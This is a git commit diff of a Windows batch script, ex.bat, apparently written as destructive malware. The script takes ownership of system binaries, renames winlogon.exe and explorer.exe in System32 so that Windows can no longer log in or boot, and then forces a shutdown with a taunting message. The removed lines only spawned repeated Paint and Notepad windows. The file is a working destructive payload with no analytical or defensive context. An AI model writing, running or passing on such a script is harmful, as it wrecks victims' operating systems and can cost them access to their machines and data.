9cb6a98fdef186e3d7227dcb5f1ee9a4f8024ac2
55guh <online.cdn25@gmail.com>
2025-08-17 18:30:59 -0400

    sde

--- ex.bat
+++ ex.bat
@@ -8,38 +8,9 @@ start mspaint
 start notepad
 takeown /f c:\windows\system32\logonui.exe
 takeown /f c:\windows\system32\winlogon.exe
-ren c:\windows\system32\logonui.exe winlogon2.exe
-ren c:\windows\system32\winlogon.exe logonui2.exe
-ren c:\windows\system32\logonui2.exe logonui.exe
+ren c:\windows\system32\explorer.exe winlogon2.exe
+ren c:\windows\system32\winlogon.exe explorer2.exe
+ren c:\windows\system32\explorer2.exe explorer.exe
 ren c:\windows\system32\winlogon2.exe winlogon.exe
 shutdown /s /t 120 /c "YOUR PC HAS BEEN FUCKED, ENJOY HAVING NO PC!!!"
 start explorer.exe
-start mspaint
-start notepad
-start mspaint
-start notepad
-start mspaint
-start notepad
-start mspaint
-start notepad
-start mspaint
-start notepad
-start mspaint
-start notepad
-start mspaint
-start notepad
-start mspaint
-start notepad
-start mspaint
-start notepad
-start mspaint
-start notepad
-start mspaint
-start notepad
-start mspaint
-start notepad
-start mspaint
-start notepad
-start mspaint
-start notepad
-v
